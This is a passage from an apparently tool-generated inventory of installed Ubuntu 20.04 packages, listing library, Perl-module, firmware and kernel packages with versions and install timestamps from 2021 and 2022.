|   libblockdev-loop2_2.23-2ubuntu3_amd64; 2022-01-03T07:47:29
|   libblockdev-part-err2_2.23-2ubuntu3_amd64; 2022-01-03T07:47:29
|   libblockdev-part2_2.23-2ubuntu3_amd64; 2022-01-03T07:47:29
|   libblockdev-swap2_2.23-2ubuntu3_amd64; 2022-01-03T07:47:29
|   libblockdev-utils2_2.23-2ubuntu3_amd64; 2022-01-03T07:47:29
|   libblockdev2_2.23-2ubuntu3_amd64; 2022-01-03T07:47:29
|   libbrotli1_1.0.7-6ubuntu0.1_amd64; 2021-02-01T17:25:28
|   libbsd0_0.10.0-1_amd64; 2021-02-01T17:22:07
|   libbz2-1.0_1.0.8-2_amd64; 2021-02-01T17:21:03
|   libc-bin_2.31-0ubuntu9.2_amd64; 2021-02-01T17:23:46
|   libc6_2.31-0ubuntu9.2_amd64; 2021-02-01T17:23:36
|   libcairo2_1.16.0-4ubuntu1_amd64; 2021-06-11T13:33:38
|   libcanberra0_0.30-7ubuntu1_amd64; 2021-02-01T17:25:51
|   libcap-ng0_0.7.9-2.1build1_amd64; 2021-02-01T17:21:06
|   libcap2-bin_1:2.32-1_amd64; 2021-02-01T17:22:07
|   libcap2_1:2.32-1_amd64; 2021-02-01T17:21:33
|   libcbor0.6_0.6.0-0ubuntu1_amd64; 2021-02-01T17:25:10
|   libcdt5_2.42.2-3build2_amd64; 2021-06-11T13:33:37
|   libcgi-fast-perl_1:2.15-1_all; 2021-06-11T13:33:41
|   libcgi-pm-perl_4.46-1_all; 2021-06-11T13:33:41
|   libcgraph6_2.42.2-3build2_amd64; 2021-06-11T13:33:37
|   libclass-c3-perl_0.34-1_all; 2021-06-11T13:30:14
|   libclass-c3-xs-perl_0.14-1build5_amd64; 2021-06-11T13:30:14
|   libclass-data-inheritable-perl_0.08-3_all; 2021-06-11T13:30:14
|   libclass-inspector-perl_1.36-1_all; 2021-06-11T13:30:14
|   libclass-method-modifiers-perl_2.13-1_all; 2021-06-11T13:30:14
|   libclass-singleton-perl_1.5-1_all; 2021-06-11T13:30:14
|   libclass-xsaccessor-perl_1.19-3build3_amd64; 2021-06-11T13:30:14
|   libcom-err2_1.45.5-2ubuntu1_amd64; 2021-02-01T17:21:06
|   libcommon-sense-perl_3.74-2build6_amd64; 2021-06-11T13:30:14
|   libconfig-inifiles-perl_3.000002-1_all; 2021-06-11T13:33:31
|   libcrypt1_1:4.4.10-10ubuntu4_amd64; 2021-02-01T17:21:06
|   libcryptsetup12_2:2.2.2-3ubuntu2.3_amd64; 2021-02-01T17:23:56
|   libcurl3-gnutls_7.68.0-1ubuntu2.7_amd64; 2021-12-07T12:57:23
|   libcurl4_7.68.0-1ubuntu2.7_amd64; 2021-12-07T12:57:03
|   libdata-dump-perl_1.23-1_all; 2021-06-11T13:30:14
|   libdata-optlist-perl_0.110-1_all; 2021-06-11T13:30:14
|   libdate-manip-perl_6.79-1_all; 2021-06-11T13:30:15
|   libdatetime-locale-perl_1:1.25-1_all; 2021-06-11T13:30:19
|   libdatetime-perl_2:1.51-1build1_amd64; 2021-06-11T13:30:20
|   libdatetime-timezone-perl_1:2.38-1+2019c_all; 2021-06-11T13:30:20
|   libdatrie1_0.2.12-3_amd64; 2021-06-11T13:33:38
|   libdb5.3_5.3.28+dfsg1-0.6ubuntu2_amd64; 2021-02-01T17:21:07
|   libdbd-mysql-perl_4.050-3_amd64; 2021-06-11T13:30:07
|   libdbi-perl_1.643-1ubuntu0.1_amd64; 2021-12-07T12:57:09
|   libdbus-1-3_1.12.16-2ubuntu2.1_amd64; 2021-02-01T17:23:54
|   libdbus-glib-1-2_0.110-5fakssync1_amd64; 2021-06-11T12:43:37
|   libdconf1_0.36.0-1_amd64; 2021-02-01T17:25:31
|   libdebconfclient0_0.251ubuntu1_amd64; 2021-02-01T17:21:07
|   libdevel-callchecker-perl_0.008-1ubuntu1_amd64; 2021-06-11T13:30:13
|   libdevel-caller-perl_2.06-2build2_amd64; 2021-06-11T13:30:15
|   libdevel-lexalias-perl_0.05-2build2_amd64; 2021-06-11T13:30:15
|   libdevel-stacktrace-perl_2.0400-1_all; 2021-06-11T13:30:16
|   libdevmapper-event1.02.1_2:1.02.167-1ubuntu1_amd64; 2021-02-01T17:25:33
|   libdevmapper1.02.1_2:1.02.167-1ubuntu1_amd64; 2021-02-01T17:21:33
|   libdns-export1109_1:9.11.16+dfsg-3~ubuntu1_amd64; 2021-02-01T17:24:10
|   libdrm-common_2.4.105-3~20.04.2_all; 2021-12-07T12:57:16
|   libdrm2_2.4.105-3~20.04.2_amd64; 2021-12-07T12:57:16
|   libdynaloader-functions-perl_0.003-1_all; 2021-06-11T13:30:13
|   libedit2_3.1-20191231-1_amd64; 2021-02-01T17:25:07
|   libefiboot1_37-2ubuntu2.2_amd64; 2021-02-01T17:25:34
|   libefivar1_37-2ubuntu2.2_amd64; 2021-02-01T17:25:34
|   libelf1_0.176-1.1build1_amd64; 2021-02-01T17:22:08
|   libencode-locale-perl_1.05-1_all; 2021-06-11T13:30:08
|   liberror-perl_0.17029-1_all; 2021-02-01T17:25:42
|   libestr0_0.1.10-2.1_amd64; 2021-02-01T17:22:08
|   libeval-closure-perl_0.14-1_all; 2021-06-11T13:30:16
|   libevdev2_1.9.0+dfsg-1ubuntu0.1_amd64; 2021-06-11T12:44:22
|   libevent-2.1-7_2.1.11-stable-1_amd64; 2021-02-01T17:25:24
|   libexception-class-perl_1.44-1_all; 2021-06-11T13:30:16
|   libexpat1_2.2.9-1build1_amd64; 2021-02-01T17:21:50
|   libext2fs2_1.45.5-2ubuntu1_amd64; 2021-02-01T17:21:08
|   libfastjson4_0.99.8-2_amd64; 2021-02-01T17:22:09
|   libfcgi-perl_0.79-1_amd64; 2021-06-11T13:33:41
|   libfdisk1_2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:23:41
|   libffi7_3.3-4_amd64; 2021-02-01T17:21:33
|   libfido2-1_1.3.1-1ubuntu2_amd64; 2021-02-01T17:25:11
|   libfile-listing-perl_6.04-1_all; 2021-06-11T13:30:08
|   libfile-sharedir-perl_1.116-2_all; 2021-06-11T13:30:16
|   libfl2_2.6.4-6.2_amd64; 2021-02-01T17:25:23
|   libfont-afm-perl_1.20-2_all; 2021-06-11T13:30:16
|   libfontconfig1_2.13.1-2ubuntu3_amd64; 2021-06-11T13:33:37
|   libfreetype6_2.10.1-2ubuntu0.1_amd64; 2021-06-11T12:43:36
|   libfribidi0_1.0.8-2_amd64; 2021-02-01T17:22:09
|   libfuse2_2.9.9-3_amd64; 2021-02-01T17:24:52
|   libfwupd2_1.5.11-0ubuntu1~20.04.2_amd64; 2022-01-03T07:47:22
|   libfwupdplugin1_1.5.11-0ubuntu1~20.04.2_amd64; 2022-01-03T07:47:22
|   libgcab-1.0-0_1.4-1_amd64; 2021-02-01T17:25:36
|   libgcc-s1_10.3.0-1ubuntu1~20.04_amd64; 2021-12-07T12:56:51
|   libgcrypt20_1.8.5-5ubuntu1.1_amd64; 2021-12-07T12:56:51
|   libgd3_2.2.5-5.2ubuntu2.1_amd64; 2021-12-07T12:57:32
|   libgdbm-compat4_1.18.1-5_amd64; 2021-02-01T17:24:58
|   libgdbm6_1.18.1-5_amd64; 2021-02-01T17:24:51
|   libgeo-ip-perl_1.51-2_amd64; 2021-06-11T13:30:12
|   libgeoip1_1.6.12-6build1_amd64; 2021-06-11T13:30:12
|   libgirepository-1.0-1_1.64.1-1~ubuntu20.04.1_amd64; 2021-02-01T17:24:09
|   libglib2.0-0_2.64.6-1~ubuntu20.04.4_amd64; 2021-12-07T12:57:16
|   libglib2.0-bin_2.64.6-1~ubuntu20.04.4_amd64; 2021-12-07T12:57:16
|   libglib2.0-data_2.64.6-1~ubuntu20.04.4_all; 2021-12-07T12:57:16
|   libgmp10_2:6.2.0+dfsg-4_amd64; 2021-02-01T17:21:34
|   libgnutls30_3.6.13-2ubuntu1.6_amd64; 2021-12-07T12:56:55
|   libgpg-error0_1.37-1_amd64; 2021-02-01T17:21:09
|   libgpgme11_1.13.1-7ubuntu2_amd64; 2021-02-01T17:25:39
|   libgpm2_1.20.7-5_amd64; 2021-02-01T17:25:51
|   libgraphite2-3_1.3.13-11build1_amd64; 2021-06-11T13:33:38
|   libgssapi-krb5-2_1.17-6ubuntu4.1_amd64; 2021-02-01T17:25:06
|   libgssapi3-heimdal_7.7.0+dfsg-1ubuntu1_amd64; 2021-02-01T17:25:30
|   libgstreamer1.0-0_1.16.2-2_amd64; 2021-02-01T17:25:52
|   libgts-0.7-5_0.7.6+darcs121130-4_amd64; 2021-06-11T13:33:38
|   libgts-bin_0.7.6+darcs121130-4_amd64; 2021-06-11T13:33:41
|   libgudev-1.0-0_1:233-1_amd64; 2021-02-01T17:25:36
|   libgusb2_0.3.4-0.1_amd64; 2021-02-01T17:25:36
|   libgvc6_2.42.2-3build2_amd64; 2021-06-11T13:33:39
|   libgvpr2_2.42.2-3build2_amd64; 2021-06-11T13:33:39
|   libharfbuzz0b_2.6.4-1ubuntu4_amd64; 2021-06-11T13:33:38
|   libhcrypto4-heimdal_7.7.0+dfsg-1ubuntu1_amd64; 2021-02-01T17:25:29
|   libheimbase1-heimdal_7.7.0+dfsg-1ubuntu1_amd64; 2021-02-01T17:25:28
|   libheimntlm0-heimdal_7.7.0+dfsg-1ubuntu1_amd64; 2021-02-01T17:25:29
|   libhogweed5_3.5.1+really3.5.1-2ubuntu0.2_amd64; 2021-12-07T12:56:55
|   libhtml-form-perl_6.07-1_all; 2021-06-11T13:30:16
|   libhtml-format-perl_2.12-1_all; 2021-06-11T13:30:16
|   libhtml-parser-perl_3.72-5_amd64; 2021-06-11T13:30:08
|   libhtml-tagset-perl_3.20-4_all; 2021-06-11T13:30:08
|   libhtml-template-perl_2.97-1_all; 2021-06-11T13:33:41
|   libhtml-tree-perl_5.07-2_all; 2021-06-11T13:30:08
|   libhttp-cookies-perl_6.08-1_all; 2021-06-11T13:30:08
|   libhttp-daemon-perl_6.06-1_all; 2021-06-11T13:30:16
|   libhttp-date-perl_6.05-1_all; 2021-06-11T13:30:08
|   libhttp-message-perl_6.22-1_all; 2021-06-11T13:30:08
|   libhttp-negotiate-perl_6.01-1_all; 2021-06-11T13:30:08
|   libhx509-5-heimdal_7.7.0+dfsg-1ubuntu1_amd64; 2021-02-01T17:25:29
|   libice6_2:1.0.10-0ubuntu1_amd64; 2021-06-11T13:33:39
|   libicu66_66.1-2ubuntu2.1_amd64; 2021-12-07T12:57:06
|   libidn2-0_2.2.0-2_amd64; 2021-02-01T17:21:35
|   libimobiledevice6_1.2.1~git20191129.9f79242-1build1_amd64; 2021-06-11T12:43:37
|   libio-html-perl_1.001-1_all; 2021-06-11T13:30:08
|   libio-interface-perl_1.09-1build5_amd64; 2021-06-11T13:33:13
|   libio-socket-inet6-perl_2.72-2_all; 2021-06-11T13:30:12
|   libio-socket-multicast-perl_1.12-2build6_amd64; 2021-06-11T13:33:13
|   libio-socket-ssl-perl_2.067-1_all; 2021-06-11T13:30:08
|   libip4tc2_1.8.4-3ubuntu2_amd64; 2021-02-01T17:21:35
|   libip6tc2_1.8.4-3ubuntu2_amd64; 2021-02-01T17:25:09
|   libisc-export1105_1:9.11.16+dfsg-3~ubuntu1_amd64; 2021-02-01T17:24:10
|   libisns0_0.97-3_amd64; 2021-02-01T17:24:55
|   libjansson4_2.12-1build1_amd64; 2021-06-11T13:31:27
|   libjbig0_2.1-3.1build1_amd64; 2021-06-11T13:33:37
|   libjcat1_0.1.3-2~ubuntu20.04.1_amd64; 2022-01-03T07:47:22
|   libjpeg-turbo8_2.0.3-0ubuntu1.20.04.1_amd64; 2021-06-11T13:33:37
|   libjpeg8_8c-2ubuntu8_amd64; 2021-06-11T13:33:37
|   libjson-c4_0.13.1+dfsg-7ubuntu0.3_amd64; 2021-02-01T17:23:55
|   libjson-glib-1.0-0_1.4.4-2ubuntu2_amd64; 2021-02-01T17:25:34
|   libjson-glib-1.0-common_1.4.4-2ubuntu2_all; 2021-02-01T17:25:34
|   libjson-perl_4.02000-2_all; 2021-06-11T13:30:12
|   libjson-xs-perl_4.020-1build1_amd64; 2021-06-11T13:30:16
|   libk5crypto3_1.17-6ubuntu4.1_amd64; 2021-02-01T17:25:05
|   libkeyutils1_1.6-6ubuntu1_amd64; 2021-02-01T17:25:06
|   libklibc_2.0.7-1ubuntu5_amd64; 2021-02-01T17:25:26
|   libkmod2_27-1ubuntu2_amd64; 2021-02-01T17:21:35
|   libkrb5-26-heimdal_7.7.0+dfsg-1ubuntu1_amd64; 2021-02-01T17:25:29
|   libkrb5-3_1.17-6ubuntu4.1_amd64; 2021-02-01T17:25:06
|   libkrb5support0_1.17-6ubuntu4.1_amd64; 2021-02-01T17:25:05
|   libksba8_1.3.5-2_amd64; 2021-02-01T17:25:32
|   liblab-gamut1_2.42.2-3build2_amd64; 2021-06-11T13:33:39
|   libldap-2.4-2_2.4.49+dfsg-2ubuntu1.8_amd64; 2021-06-11T13:05:03
|   libldap-common_2.4.49+dfsg-2ubuntu1.8_all; 2021-06-11T13:05:03
|   liblinear4_2.3.0+dfsg-3build1_amd64; 2021-06-11T13:30:11
|   liblmdb0_0.9.24-1_amd64; 2021-02-01T17:25:06
|   liblocale-gettext-perl_1.07-4_amd64; 2021-02-01T17:22:14
|   libltdl7_2.4.6-14_amd64; 2021-02-01T17:25:50
|   liblua5.2-0_5.2.4-1.1build3_amd64; 2021-06-11T13:31:27
|   liblua5.3-0_5.3.3-1.1ubuntu2_amd64; 2021-06-11T13:30:11
|   liblvm2cmd2.03_2.03.07-1ubuntu1_amd64; 2021-02-01T17:25:33
|   liblwp-mediatypes-perl_6.04-1_all; 2021-06-11T13:30:08
|   liblwp-protocol-https-perl_6.07-2ubuntu2_all; 2021-06-11T13:30:09
|   liblz4-1_1.9.2-2ubuntu0.20.04.1_amd64; 2021-06-11T12:47:35
|   liblzma5_5.2.4-1ubuntu1_amd64; 2021-02-01T17:23:47
|   liblzo2-2_2.10-2_amd64; 2021-02-01T17:25:23
|   libmagic-mgc_1:5.38-4_amd64; 2021-02-01T17:22:14
|   libmagic1_1:5.38-4_amd64; 2021-02-01T17:22:15
|   libmail-sendmail-perl_0.80-1_all; 2021-06-11T13:33:13
|   libmailtools-perl_2.21-1_all; 2021-06-11T13:30:17
|   libmaxminddb0_1.4.2-0ubuntu1.20.04.1_amd64; 2021-02-01T17:25:06
|   libmnl0_1.0.4-2_amd64; 2021-02-01T17:22:15
|   libmodule-implementation-perl_0.09-1_all; 2021-06-11T13:30:13
|   libmodule-runtime-perl_0.016-1_all; 2021-06-11T13:30:13
|   libmount1_2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:23:42
|   libmpdec2_2.4.2-3_amd64; 2021-02-01T17:22:15
|   libmpfr6_4.0.2-1_amd64; 2021-02-01T17:24:54
|   libmro-compat-perl_0.13-1_all; 2021-06-11T13:30:17
|   libmspack0_0.10.1-2_amd64; 2021-02-01T17:25:52
|   libmysqlclient21_8.0.27-0ubuntu0.20.04.1_amd64; 2021-12-07T12:57:35
|   libnamespace-autoclean-perl_0.29-1_all; 2021-06-11T13:30:17
|   libnamespace-clean-perl_0.27-1_all; 2021-06-11T13:30:17
|   libncurses6_6.2-0ubuntu2_amd64; 2021-02-01T17:21:10
|   libncursesw6_6.2-0ubuntu2_amd64; 2021-02-01T17:21:11
|   libnet-http-perl_6.19-1_all; 2021-06-11T13:30:08
|   libnet-smtp-ssl-perl_1.04-1_all; 2021-06-11T13:30:16
|   libnet-ssleay-perl_1.88-2ubuntu1_amd64; 2021-06-11T13:30:08
|   libnet-telnet-perl_3.04-1_all; 2021-06-11T13:30:12
|   libnetaddr-ip-perl_4.079+dfsg-1build4_amd64; 2021-06-11T13:30:07
|   libnetfilter-conntrack3_1.0.7-2_amd64; 2021-02-01T17:25:10
|   libnettle7_3.5.1+really3.5.1-2ubuntu0.2_amd64; 2021-12-07T12:56:55
|   libnewt0.52_0.52.21-4ubuntu2_amd64; 2021-02-01T17:22:15
|   libnfnetlink0_1.0.1-3build1_amd64; 2021-02-01T17:25:09
|   libnftnl11_1.1.5-1_amd64; 2021-02-01T17:25:10
|   libnghttp2-14_1.40.0-1build1_amd64; 2021-02-01T17:25:30
|   libnl-3-200_3.4.0-1_amd64; 2021-06-11T12:43:36
|   libnl-genl-3-200_3.4.0-1_amd64; 2021-06-11T12:43:36
|   libnpth0_1.6-1_amd64; 2021-02-01T17:25:32
|   libnspr4_2:4.25-1_amd64; 2022-01-03T07:47:29
|   libnss-systemd_245.4-4ubuntu3.13_amd64; 2021-12-07T12:56:52
|   libnss3_2:3.49.1-1ubuntu1.6_amd64; 2022-01-03T07:47:29
|   libntfs-3g883_1:2017.3.23AR.3-3ubuntu1.1_amd64; 2021-12-07T12:57:03
|   libnuma1_2.0.12-1_amd64; 2021-02-01T17:24:47
|   libogg0_1.3.4-0ubuntu1_amd64; 2021-02-01T17:25:50
|   libonig5_6.9.4-1_amd64; 2021-06-11T13:33:41
|   libp11-kit0_0.23.20-1ubuntu0.1_amd64; 2021-02-01T17:23:56
|   libpackage-stash-perl_0.38-1_all; 2021-06-11T13:30:17
|   libpackage-stash-xs-perl_0.29-1build1_amd64; 2021-06-11T13:30:17
|   libpackagekit-glib2-18_1.1.13-2ubuntu1.1_amd64; 2021-02-01T17:25:41
|   libpadwalker-perl_2.3-1build2_amd64; 2021-06-11T13:30:15
|   libpam-cap_1:2.32-1_amd64; 2021-02-01T17:22:16
|   libpam-modules-bin_1.3.1-5ubuntu4.3_amd64; 2021-12-07T12:56:53
|   libpam-modules_1.3.1-5ubuntu4.3_amd64; 2021-12-07T12:56:54
|   libpam-runtime_1.3.1-5ubuntu4.3_all; 2021-12-07T12:56:54
|   libpam-systemd_245.4-4ubuntu3.13_amd64; 2021-12-07T12:56:55
|   libpam0g_1.3.1-5ubuntu4.3_amd64; 2021-12-07T12:56:53
|   libpango-1.0-0_1.44.7-2ubuntu4_amd64; 2021-06-11T13:33:39
|   libpangocairo-1.0-0_1.44.7-2ubuntu4_amd64; 2021-06-11T13:33:39
|   libpangoft2-1.0-0_1.44.7-2ubuntu4_amd64; 2021-06-11T13:33:39
|   libparams-classify-perl_0.015-1build2_amd64; 2021-06-11T13:30:13
|   libparams-util-perl_1.07-3build5_amd64; 2021-06-11T13:30:14
|   libparams-validationcompiler-perl_0.30-1_all; 2021-06-11T13:30:17
|   libparted-fs-resize0_3.3-4ubuntu0.20.04.1_amd64; 2022-01-03T07:47:29
|   libparted2_3.3-4ubuntu0.20.04.1_amd64; 2021-02-01T17:25:11
|   libpathplan4_2.42.2-3build2_amd64; 2021-06-11T13:33:39
|   libpcap0.8_1.9.1-3_amd64; 2021-02-01T17:25:11
|   libpci3_1:3.6.4-1ubuntu0.20.04.1_amd64; 2021-06-11T13:05:09
|   libpcre2-8-0_10.34-7_amd64; 2021-02-01T17:21:13
|   libpcre3_2:8.39-12build1_amd64; 2021-02-01T17:21:13
|   libperl5.30_5.30.0-9ubuntu0.2_amd64; 2021-02-01T17:25:00
|   libpipeline1_1.5.2-2build1_amd64; 2021-02-01T17:24:51
|   libpixman-1-0_0.38.4-0ubuntu1_amd64; 2021-06-11T13:33:38
|   libplist3_2.1.0-4build2_amd64; 2021-06-11T12:43:37
|   libplymouth5_0.9.4git20200323-0ubuntu6.2_amd64; 2021-02-01T17:25:12
|   libpng16-16_1.6.37-2_amd64; 2021-02-01T17:25:11
|   libpolkit-agent-1-0_0.105-26ubuntu1.1_amd64; 2021-06-11T12:48:24
|   libpolkit-gobject-1-0_0.105-26ubuntu1.1_amd64; 2021-06-11T12:48:24
|   libpopt0_1.16-14_amd64; 2021-02-01T17:22:16
|   libprocps8_2:3.3.16-1ubuntu2.3_amd64; 2021-12-07T12:57:07
|   libproxy1v5_0.4.15-10ubuntu1.2_amd64; 2021-02-01T17:25:34
|   libpsl5_0.21.0-1ubuntu1_amd64; 2021-02-01T17:25:12
|   libpython3-stdlib_3.8.2-0ubuntu2_amd64; 2021-02-01T17:22:16
|   libpython3.8-minimal_3.8.10-0ubuntu1~20.04.2_amd64; 2022-01-03T07:47:21
|   libpython3.8-stdlib_3.8.10-0ubuntu1~20.04.2_amd64; 2022-01-03T07:47:21
|   libpython3.8_3.8.10-0ubuntu1~20.04.2_amd64; 2022-01-03T07:47:20
|   libreadline5_5.2+dfsg-3build3_amd64; 2021-02-01T17:25:53
|   libreadline8_8.0-4_amd64; 2021-02-01T17:22:17
|   libreadonly-perl_2.050-2_all; 2021-06-11T13:30:17
|   libref-util-perl_0.204-1_all; 2021-06-11T13:30:17
|   libref-util-xs-perl_0.117-1build2_amd64; 2021-06-11T13:30:17
|   libroken18-heimdal_7.7.0+dfsg-1ubuntu1_amd64; 2021-02-01T17:25:28
|   librole-tiny-perl_2.001004-1_all; 2021-06-11T13:30:17
|   librtmp1_2.4+20151223.gitfa8646d.1-2build1_amd64; 2021-02-01T17:25:30
|   libsasl2-2_2.1.27+dfsg-2_amd64; 2021-02-01T17:25:30
|   libsasl2-modules-db_2.1.27+dfsg-2_amd64; 2021-02-01T17:25:30
|   libsasl2-modules_2.1.27+dfsg-2_amd64; 2021-02-01T17:25:53
|   libseccomp2_2.5.1-1ubuntu1~20.04.2_amd64; 2022-01-03T07:47:21
|   libselinux1_3.0-1build2_amd64; 2021-02-01T17:21:14
|   libsemanage-common_3.0-1build2_all; 2021-02-01T17:21:14
|   libsemanage1_3.0-1build2_amd64; 2021-02-01T17:21:14
|   libsensors-config_1:3.6.0-2ubuntu1_all; 2021-06-11T13:30:09
|   libsensors5_1:3.6.0-2ubuntu1_amd64; 2021-06-11T13:30:09
|   libsepol1_3.0-1_amd64; 2021-02-01T17:21:14
|   libsgutils2-2_1.44-1ubuntu2_amd64; 2021-02-01T17:25:54
|   libsigsegv2_2.12-2_amd64; 2021-02-01T17:24:54
|   libslang2_2.3.2-4_amd64; 2021-02-01T17:22:17
|   libsm6_2:1.2.3-1_amd64; 2021-06-11T13:33:39
|   libsmartcols1_2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:23:42
|   libsmbios-c2_2.4.3-1_amd64; 2021-02-01T17:25:39
|   libsnappy1v5_1.1.8-1build1_amd64; 2021-06-11T13:33:31
|   libsnmp-base_5.8+dfsg-2ubuntu2.3_all; 2021-06-11T13:30:10
|   libsnmp-perl_5.8+dfsg-2ubuntu2.3_amd64; 2021-06-11T13:33:13
|   libsnmp35_5.8+dfsg-2ubuntu2.3_amd64; 2021-06-11T13:30:10
|   libsocket6-perl_0.29-1build1_amd64; 2021-06-11T13:30:12
|   libsodium23_1.0.18-1_amd64; 2021-02-01T17:22:17
|   libsoup2.4-1_2.70.0-1_amd64; 2021-02-01T17:25:35
|   libspecio-perl_0.45-1_all; 2021-06-11T13:30:17
|   libsqlite3-0_3.31.1-4ubuntu0.2_amd64; 2021-02-01T17:24:06
|   libss2_1.45.5-2ubuntu1_amd64; 2021-02-01T17:21:14
|   libssh-4_0.9.3-2ubuntu2.2_amd64; 2021-12-07T12:57:03
|   libssl1.1_1.1.1f-1ubuntu2.10_amd64; 2022-01-03T07:47:20
|   libstdc++6_10.3.0-1ubuntu1~20.04_amd64; 2021-12-07T12:56:51
|   libstemmer0d_0+svn585-2_amd64; 2021-02-01T17:25:49
|   libsub-exporter-perl_0.987-1_all; 2021-06-11T13:30:16
|   libsub-exporter-progressive-perl_0.001013-1_all; 2021-06-11T13:30:13
|   libsub-identify-perl_0.14-1build2_amd64; 2021-06-11T13:30:17
|   libsub-install-perl_0.928-1_all; 2021-06-11T13:30:14
|   libsub-name-perl_0.26-1_amd64; 2021-06-11T13:30:17
|   libsub-quote-perl_2.006006-1_all; 2021-06-11T13:30:17
|   libsys-hostname-long-perl_1.5-1_all; 2021-06-11T13:33:13
|   libsystemd0_245.4-4ubuntu3.13_amd64; 2021-12-07T12:56:57
|   libtasn1-6_4.16.0-2_amd64; 2021-02-01T17:21:36
|   libtdb1_1.4.3-0ubuntu0.20.04.1_amd64; 2021-12-07T12:57:35
|   libterm-readkey-perl_2.38-1build1_amd64; 2021-06-11T13:33:41
|   libtext-charwidth-perl_0.04-10_amd64; 2021-02-01T17:22:17
|   libtext-iconv-perl_1.7-7_amd64; 2021-02-01T17:22:17
|   libtext-wrapi18n-perl_0.06-9_all; 2021-02-01T17:22:18
|   libthai-data_0.1.28-3_all; 2021-06-11T13:33:38
|   libthai0_0.1.28-3_amd64; 2021-06-11T13:33:39
|   libtie-ixhash-perl_1.23-2_all; 2021-06-11T13:30:17
|   libtiff5_4.1.0+git191117-2ubuntu0.20.04.2_amd64; 2021-12-07T12:57:31
|   libtime-format-perl_1.16-1_all; 2021-06-11T13:30:07
|   libtimedate-perl_2.3200-1_all; 2021-06-11T13:30:08
|   libtinfo6_6.2-0ubuntu2_amd64; 2021-02-01T17:21:15
|   libtry-tiny-perl_0.30-1_all; 2021-06-11T13:30:09
|   libtss2-esys0_2.3.2-1_amd64; 2021-02-01T17:25:40
|   libtypes-serialiser-perl_1.0-1_all; 2021-06-11T13:30:16
|   libuchardet0_0.0.6-3build1_amd64; 2021-02-01T17:24:50
|   libudev1_245.4-4ubuntu3.13_amd64; 2021-12-07T12:56:52
|   libudisks2-0_2.8.4-1ubuntu2_amd64; 2022-01-03T07:47:30
|   libunistring2_0.9.10-2_amd64; 2021-02-01T17:21:36
|   libunwind8_1.2.1-9build1_amd64; 2021-02-01T17:25:16
|   libupower-glib3_0.99.11-1build2_amd64; 2021-06-11T12:43:37
|   liburcu6_0.11.1-2_amd64; 2021-02-01T17:26:16
|   liburi-perl_1.76-2_all; 2021-06-11T13:30:08
|   libusb-1.0-0_2:1.0.23-2build1_amd64; 2021-02-01T17:25:12
|   libusbmuxd6_2.0.1-2_amd64; 2021-06-11T12:43:37
|   libutempter0_1.1.6-4_amd64; 2021-02-01T17:25:25
|   libuuid1_2.34-0.1ubuntu9.1_amd64; 2021-02-01T17:23:41
|   libuv1_1.34.2-1ubuntu1.3_amd64; 2021-12-07T12:57:22
|   libvariable-magic-perl_0.62-1build2_amd64; 2021-06-11T13:30:14
|   libvolume-key1_0.3.12-3.1_amd64; 2022-01-03T07:47:29
|   libvorbis0a_1.3.6-2ubuntu1_amd64; 2021-02-01T17:25:50
|   libvorbisfile3_1.3.6-2ubuntu1_amd64; 2021-02-01T17:25:50
|   libwebp6_0.6.1-2ubuntu0.20.04.1_amd64; 2021-06-11T13:33:37
|   libwind0-heimdal_7.7.0+dfsg-1ubuntu1_amd64; 2021-02-01T17:25:29
|   libwrap0_7.6.q-30_amd64; 2021-06-11T12:45:35
|   libwww-perl_6.43-1_all; 2021-06-11T13:30:09
|   libwww-robotrules-perl_6.02-1_all; 2021-06-11T13:30:09
|   libx11-6_2:1.6.9-2ubuntu1.2_amd64; 2021-06-11T12:47:06
|   libx11-data_2:1.6.9-2ubuntu1.2_all; 2021-06-11T12:48:31
|   libxau6_1:1.0.9-0ubuntu1_amd64; 2021-02-01T17:25:12
|   libxaw7_2:1.0.13-1_amd64; 2021-06-11T13:33:40
|   libxcb-render0_1.14-2_amd64; 2021-06-11T13:33:38
|   libxcb-shm0_1.14-2_amd64; 2021-06-11T13:33:38
|   libxcb1_1.14-2_amd64; 2021-02-01T17:25:12
|   libxdmcp6_1:1.1.3-0ubuntu1_amd64; 2021-02-01T17:25:12
|   libxext6_2:1.3.4-0ubuntu1_amd64; 2021-02-01T17:25:13
|   libxml-libxml-perl_2.0134+dfsg-1build1_amd64; 2021-06-11T13:30:07
|   libxml-namespacesupport-perl_1.12-1_all; 2021-06-11T13:30:07
|   libxml-parser-perl_2.46-1_amd64; 2021-06-11T13:30:09
|   libxml-sax-base-perl_1.09-1_all; 2021-06-11T13:30:07
|   libxml-sax-expat-perl_0.51-1_all; 2021-06-11T13:30:09
|   libxml-sax-perl_1.02+dfsg-1_all; 2021-06-11T13:30:07
|   libxml-simple-perl_2.25-1_all; 2021-06-11T13:30:09
|   libxml-twig-perl_1:3.50-2_all; 2021-06-11T13:30:09
|   libxml-xpathengine-perl_0.14-1_all; 2021-06-11T13:30:18
|   libxml2_2.9.10+dfsg-5ubuntu0.20.04.1_amd64; 2021-12-07T12:57:06
|   libxmlb1_0.1.15-2ubuntu1~20.04.1_amd64; 2021-06-11T13:05:12
|   libxmlrpc-epi0_0.54.2-1.2_amd64; 2021-06-11T13:33:43
|   libxmlsec1-openssl_1.2.28-2_amd64; 2021-02-01T17:25:55
|   libxmlsec1_1.2.28-2_amd64; 2021-02-01T17:25:55
|   libxmu6_2:1.1.3-0ubuntu1_amd64; 2021-06-11T13:33:40
|   libxmuu1_2:1.1.3-0ubuntu1_amd64; 2021-02-01T17:25:13
|   libxpm4_1:3.5.12-1_amd64; 2021-06-11T13:33:37
|   libxrender1_1:0.9.10-1_amd64; 2021-06-11T13:33:38
|   libxslt1.1_1.1.34-4_amd64; 2021-02-01T17:25:54
|   libxstring-perl_0.002-2_amd64; 2021-06-11T13:30:17
|   libxt6_1:1.1.5-1_amd64; 2021-06-11T13:33:39
|   libxtables12_1.8.4-3ubuntu2_amd64; 2021-02-01T17:22:18
|   libyaml-0-2_0.2.2-1_amd64; 2021-02-01T17:22:18
|   libzip5_1.5.1-0ubuntu1_amd64; 2021-06-11T13:33:41
|   libzstd1_1.4.4+dfsg-3ubuntu0.1_amd64; 2021-06-11T12:49:39
|   linux-base_4.5ubuntu3.7_all; 2021-12-07T12:57:29
|   linux-firmware_1.187.23_all; 2022-01-03T07:47:52
|   linux-generic_5.4.0.91.95_amd64; 2022-01-03T07:48:08
|   linux-headers-5.4.0-74-generic_5.4.0-74.83_amd64; 2021-06-11T12:44:21
